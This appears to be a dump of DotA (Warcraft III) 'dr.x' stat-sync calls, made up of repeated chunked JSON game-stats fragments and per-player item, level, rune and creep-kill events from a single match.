	SendSyncDat("dr.x", "game_stats", "kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"", 0);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"", 0);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"", 0);
	SendSyncDat("dr.x", "game_stats", "kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"", 0);
	SendSyncDat("dr.x", "game_stats", "creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":385,\"hero\":1211117643,\"id\":9,\"items\":[1227895375,", 0);
	SendSyncDat("dr.x", "game_stats", "creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":385,\"hero\":1211117643,\"id\":9,\"items\":[1227895375,", 0);
	SendSyncDat("dr.x", "game_stats", "creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":385,\"hero\":1211117643,\"id\":9,\"items\":[1227895375,", 0);
	SendSyncDat("dr.x", "game_stats", "creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":385,\"hero\":1211117643,\"id\":9,\"items\":[1227895375,", 0);
	SendSyncDat("dr.x", "game_stats", "creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":385,\"hero\":1211117643,\"id\":9,\"items\":[1227895375,", 0);
	SendSyncDat("dr.x", "game_stats", "creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":385,\"hero\":1211117643,\"id\":9,\"items\":[1227895375,", 0);
	SendSyncDat("dr.x", "game_stats", "creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":385,\"hero\":1211117643,\"id\":9,\"items\":[1227895375,", 0);
	SendSyncDat("dr.x", "game_stats", "creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":385,\"hero\":1211117643,\"id\":9,\"items\":[1227895375,", 0);
	SendSyncDat("dr.x", "game_stats", "creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":385,\"hero\":1211117643,\"id\":9,\"items\":[1227895375,", 0);
	SendSyncDat("dr.x", "game_stats", "creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"gold\":385,\"hero\":1211117643,\"id\":9,\"items\":[1227895375,", 0);
	SendSyncDat("dr.x", "game_stats", "1227896137,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills", 0);
	SendSyncDat("dr.x", "game_stats", "1227896137,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills", 0);
	SendSyncDat("dr.x", "game_stats", "1227896137,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills", 0);
	SendSyncDat("dr.x", "game_stats", "1227896137,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills", 0);
	SendSyncDat("dr.x", "game_stats", "1227896137,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills", 0);
	SendSyncDat("dr.x", "game_stats", "1227896137,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills", 0);
	SendSyncDat("dr.x", "game_stats", "1227896137,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills", 0);
	SendSyncDat("dr.x", "game_stats", "1227896137,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills", 0);
	SendSyncDat("dr.x", "game_stats", "1227896137,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills", 0);
	SendSyncDat("dr.x", "game_stats", "1227896137,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills", 0);
	SendSyncDat("dr.x", "game_stats", "\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"go", 0);
	SendSyncDat("dr.x", "game_stats", "\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"go", 0);
	SendSyncDat("dr.x", "game_stats", "\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"go", 0);
	SendSyncDat("dr.x", "game_stats", "\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"go", 0);
	SendSyncDat("dr.x", "game_stats", "\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"go", 0);
	SendSyncDat("dr.x", "game_stats", "\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"go", 0);
	SendSyncDat("dr.x", "game_stats", "\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"go", 0);
	SendSyncDat("dr.x", "game_stats", "\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"go", 0);
	SendSyncDat("dr.x", "game_stats", "\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"go", 0);
	SendSyncDat("dr.x", "game_stats", "\":0,\"tower_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":0,\"deaths\":0,\"firestone\":0,\"froststone\":0,\"go", 0);
	SendSyncDat("dr.x", "game_stats", "ld\":208,\"hero\":1212365106,\"id\":10,\"items\":[1227896131,1227896132,1227895879,1227895385,1227895879,0],\"kills\":0,\"left_time\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "ld\":208,\"hero\":1212365106,\"id\":10,\"items\":[1227896131,1227896132,1227895879,1227895385,1227895879,0],\"kills\":0,\"left_time\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "ld\":208,\"hero\":1212365106,\"id\":10,\"items\":[1227896131,1227896132,1227895879,1227895385,1227895879,0],\"kills\":0,\"left_time\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "ld\":208,\"hero\":1212365106,\"id\":10,\"items\":[1227896131,1227896132,1227895879,1227895385,1227895879,0],\"kills\":0,\"left_time\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "ld\":208,\"hero\":1212365106,\"id\":10,\"items\":[1227896131,1227896132,1227895879,1227895385,1227895879,0],\"kills\":0,\"left_time\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "ld\":208,\"hero\":1212365106,\"id\":10,\"items\":[1227896131,1227896132,1227895879,1227895385,1227895879,0],\"kills\":0,\"left_time\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "ld\":208,\"hero\":1212365106,\"id\":10,\"items\":[1227896131,1227896132,1227895879,1227895385,1227895879,0],\"kills\":0,\"left_time\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "ld\":208,\"hero\":1212365106,\"id\":10,\"items\":[1227896131,1227896132,1227895879,1227895385,1227895879,0],\"kills\":0,\"left_time\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "ld\":208,\"hero\":1212365106,\"id\":10,\"items\":[1227896131,1227896132,1227895879,1227895385,1227895879,0],\"kills\":0,\"left_time\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "ld\":208,\"hero\":1212365106,\"id\":10,\"items\":[1227896131,1227896132,1227895879,1227895385,1227895879,0],\"kills\":0,\"left_time\":0,\"ne", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "game_stats", "utral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0}]}", 0);
	SendSyncDat("dr.x", "game_stats", "end 0", 0);
	SendSyncDat("dr.x", "Data", "GameStart", 1);
	SendSyncDat("dr.x", "Data", "RuneUse6", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "RuneUse6", 5);
	SendSyncDat("dr.x", "Data", "PUI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_5", 0);
	SendSyncDat("dr.x", "Data", "Level2", 5);
	SendSyncDat("dr.x", "Data", "Level2", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "Level2", 2);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227896131);
	SendSyncDat("dr.x", "Data", "Level3", 5);
	SendSyncDat("dr.x", "Data", "Level2", 4);
	SendSyncDat("dr.x", "Data", "Level3", 8);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895894);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895894);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "Level2", 11);
	SendSyncDat("dr.x", "Data", "Level2", 9);
	SendSyncDat("dr.x", "Data", "Level2", 10);
	SendSyncDat("dr.x", "Data", "Level2", 7);
	SendSyncDat("dr.x", "Data", "Level2", 3);
	SendSyncDat("dr.x", "Data", "Level2", 1);
	SendSyncDat("dr.x", "Data", "Level3", 2);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903796);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903796);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227902265);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227902265);
	SendSyncDat("dr.x", "Data", "DRI_11", 1227895385);
	SendSyncDat("dr.x", "Data", "DRI_11", 1227895879);
	SendSyncDat("dr.x", "Data", "DRI_11", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227900739);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227900994);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227900739);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896134);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896134);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227900739);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900977);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900977);
	SendSyncDat("dr.x", "Data", "Level4", 5);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227900977);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse1", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896134);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227902030);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227895898);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895894);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227902028);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse6", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "Level3", 3);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227895898);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227895898);
	SendSyncDat("dr.x", "Data", "Level3", 1);
	SendSyncDat("dr.x", "Data", "DRI_11", 1227896131);
	SendSyncDat("dr.x", "Data", "Level4", 8);
	SendSyncDat("dr.x", "Data", "Level3", 7);
	SendSyncDat("dr.x", "Data", "Level3", 11);
	SendSyncDat("dr.x", "Data", "Level4", 2);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227902265);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227902265);
	SendSyncDat("dr.x", "Data", "Level3", 4);
	SendSyncDat("dr.x", "Data", "Level3", 9);
	SendSyncDat("dr.x", "Data", "CSK1", 2);
	SendSyncDat("dr.x", "Data", "CSD1", 2);
	SendSyncDat("dr.x", "Data", "NK1", 0);
	SendSyncDat("dr.x", "Data", "CSK7", 9);
	SendSyncDat("dr.x", "Data", "CSD7", 1);
	SendSyncDat("dr.x", "Data", "NK7", 0);
	SendSyncDat("dr.x", "Data", "CSK2", 11);
	SendSyncDat("dr.x", "Data", "CSD2", 2);
	SendSyncDat("dr.x", "Data", "NK2", 0);
	SendSyncDat("dr.x", "Data", "CSK8", 10);
	SendSyncDat("dr.x", "Data", "CSD8", 1);
	SendSyncDat("dr.x", "Data", "NK8", 0);
	SendSyncDat("dr.x", "Data", "CSK3", 11);
	SendSyncDat("dr.x", "Data", "CSD3", 1);
	SendSyncDat("dr.x", "Data", "NK3", 0);
	SendSyncDat("dr.x", "Data", "CSK9", 3);
	SendSyncDat("dr.x", "Data", "CSD9", 1);
	SendSyncDat("dr.x", "Data", "NK9", 0);
	SendSyncDat("dr.x", "Data", "CSK4", 0);
	SendSyncDat("dr.x", "Data", "CSD4", 0);
	SendSyncDat("dr.x", "Data", "NK4", 12);
	SendSyncDat("dr.x", "Data", "CSK10", 0);
	SendSyncDat("dr.x", "Data", "CSD10", 0);
	SendSyncDat("dr.x", "Data", "NK10", 0);
	SendSyncDat("dr.x", "Data", "CSK5", 7);
	SendSyncDat("dr.x", "Data", "CSD5", 3);
	SendSyncDat("dr.x", "Data", "NK5", 0);
	SendSyncDat("dr.x", "Data", "CSK11", 9);
	SendSyncDat("dr.x", "Data", "CSD11", 3);
	SendSyncDat("dr.x", "Data", "NK11", 0);
	SendSyncDat("dr.x", "Data", "Level3", 10);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895893);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896134);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896134);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895893);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895879);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227895375);
	SendSyncDat("dr.x", "Data", "Level5", 5);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227896131);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896134);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "Level5", 8);
	SendSyncDat("dr.x", "Data", "Level5", 2);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227903796);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227903796);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903286);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895894);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "Level4", 7);
	SendSyncDat("dr.x", "Data", "RuneUse4", 5);
	SendSyncDat("dr.x", "Data", "PUI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse6", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "Hero5", 10);
	SendSyncDat("dr.x", "Data", "Assist8", 5);
	SendSyncDat("dr.x", "Data", "Hero10", 10);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "Level4", 3);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227902537);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227902537);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895863);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895863);
	SendSyncDat("dr.x", "Data", "Level4", 9);
	SendSyncDat("dr.x", "Data", "Level4", 1);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896132);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895385);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895385);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895385);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895879);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227900739);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227900994);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "Level4", 11);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896131);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "Level4", 10);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227895894);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227895898);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227902028);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895861);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895861);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902028);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902028);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895375);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "Level6", 8);
	SendSyncDat("dr.x", "Data", "Level6", 5);
	SendSyncDat("dr.x", "Data", "Level6", 2);
	SendSyncDat("dr.x", "Data", "Level4", 4);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227903796);
	SendSyncDat("dr.x", "Data", "Level5", 7);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227902028);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227902028);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227902028);
	SendSyncDat("dr.x", "Data", "Hero3", 8);
	SendSyncDat("dr.x", "Data", "Assist7", 3);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896394);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896134);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896136);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227903025);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896134);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896136);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896136);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896134);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227895375);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896136);
	SendSyncDat("dr.x", "Data", "RuneUse6", 5);
	SendSyncDat("dr.x", "Data", "PUI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900762);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900762);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227900762);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse5", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "Level5", 1);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227903796);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227900739);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227896131);
